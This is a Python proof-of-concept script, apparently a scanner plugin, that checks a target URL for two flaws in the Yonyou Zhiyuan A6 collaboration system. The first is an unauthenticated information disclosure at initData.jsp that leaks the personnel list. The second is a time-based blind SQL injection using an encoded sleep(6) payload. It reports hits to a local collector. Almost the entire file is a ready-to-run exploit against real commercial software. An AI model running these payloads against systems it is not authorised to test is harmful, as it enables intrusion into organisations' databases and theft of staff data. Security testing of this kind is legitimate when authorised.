#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友致远A6协同系统敏感信息泄露&SQL注射
referer: http://www.wooyun.org/bugs/wooyun-2015-0107543
author: Lucifer
description: 用友致远A6 /yyoa/common/selectPersonNew/initData.jsp?trueName=1文件存在敏感信息泄露,并且存在SQL注入漏洞。
'''
import sys
import time
import requests
import warnings
from termcolor import cprint

class yonyou_initData_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/yyoa/common/selectPersonNew/initData.jsp?trueName=1"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"personList" in req.text and r"new Person" in req.text:
                cprint("[+]存在用友致远A6协同系统敏感信息泄露漏洞...(敏感信息)\tpayload: "+vulnurl, "green")
                postdata = {self.url:"存在用友致远A6协同系统敏感信息泄露漏洞...(敏感信息)\tpayload: "+vulnurl}
                requests.post('http://localhost:8848/cms', json=postdata)

            vulnurl = self.url + "/yyoa/common/selectPersonNew/initData.jsp?trueName=1%25%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28sleep%286%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C1%29%29>64%20AND%20%27%25%27%3D%27"
            start_time = time.time()
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                cprint("[+]存在用友致远A6协同系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                postdata = {self.url:"存在用友致远A6协同系统SQL注入漏洞...(高危)\tpayload: "+vulnurl}
                requests.post('http://localhost:8848/cms', json=postdata)
            else:
                cprint("[-]不存在yonyou_initData_disclosure漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = yonyou_initData_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()
